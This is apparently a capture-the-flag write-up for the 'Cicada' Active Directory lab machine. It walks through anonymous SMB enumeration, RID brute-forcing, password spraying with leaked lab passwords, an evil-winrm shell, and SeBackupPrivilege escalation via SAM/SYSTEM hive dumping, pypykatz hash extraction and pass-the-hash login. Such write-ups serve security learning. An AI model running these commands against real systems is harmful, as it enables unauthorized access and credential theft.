# Cicada

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Machine IP Address : 10.10.11.35



### Enumeration Phase

Start with Nmap Scan

```
nmap -Pn -A -p- 10.10.11.35
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This seems to be an Active Directory box.



### Enumerating SMB

I started by enumerating SMB to see what access is available for guest/anonymous users.

```
smbmap -H 10.10.11.35 -u 'anonymous'
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

First, I tried accessing each share. Using smbclient, I was able to access the HR share.

```
smbclient \\\\10.10.11.35\\HR -U "anonymous"
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

"I used the `get` command in smbclient to transfer the 'Notice from HR.txt' file, which revealed a password."

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now that we have a password, let's see if any users are using it.



### Enumerating Users

We try to find domain users by brute-forcing RIDs.

```
nxc smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I found several usernames, so I’ll try to validate them using the password we discovered. I put all the usernames in a text file and performed a password spray.

```
nxc smb 10.10.11.35 -u userrr.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' 
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We found a user who uses the password: 'michael.wrightson.

Next, I’ll look for a user with higher privileges.

```
nxc smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'  --users
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we found a user whose password is stored in the description

Now, I ran `smbmap` to check if this user has access to more shares, and it turns out they do.

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

Checked the 'DEV' share and found a PowerShell script called 'Backup\_script.ps1.

"Executed the following commands to access the DEV share:

```bash
smbclient \\\\10.10.11.35\\DEV -U 'david.orelious'
Password for [WORKGROUP\david.orelious]:
```

I listed the contents with the `ls`command , and `get`the Backup\_script.ps1

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Checking its contents revealed a new user, 'emily.oscars,' along with her password!

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Get the Shell

Enumerated the shares with the new user but found nothing, so I tried to get a shell using ‘evil-winrm.

```
evil-winrm -i 10.10.11.35  -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

Successfully obtained a shell.

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Searched for the user flag in several directories and finally found it in `Desktop/user.txt`.

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

### PrivEsc

Ran `whoami /priv` to check the user's privileges

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

With this, I realized that ‘SeBackupPrivilege’ can be used to gain read access to any file, including `root.txt`.

I did some more research and found a PowerShell script to access the `root.txt` file

{% embed url="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1?source=post_page-----83ddcc0db5c7--------------------------------" %}

We start with transfer the script to target computer with our python server running and following command.

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Now, I ran the script using the following command to get access to the `root.txt` file

```
Acl-FullControl -user cicada\emily.oscars -path C:\users\administrator\desktop
```

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Now, I can view the contents of `root.txt`!

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

## Other Method

Follow and refer this site to exploit : [Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)&#x20;

Create or enter a folder where you want to save the files.

First, save the SAM and SYSTEM registry hives using the following commands:

```
reg save HKLM\SAM C:\Users\emily.oscar.CICADA\Videos\sam
reg save HKLM\SYSTEM C:\Users\emily.oscar.CICADA\Videos\system
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Download the files to your local machine, then use `pypykatz` to extract the hashes.

Using this command:

```
pypykatz registry --sam sam system
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

With the extracted hash, we can now log in again. Instead of using the password, we'll use the `-H` option to authenticate with the hash.

This allows us to bypass the need for a password and authenticate directly using the hash, providing elevated access.

Using this command:&#x20;

```
evil-winrm -i 10.10.11.35  -u 'Administrator' -H 'hash'
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Logged in as the Administrator using the hash, located the `root.flag` file, and displayed its contents with `cat`. Challenge complete!

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
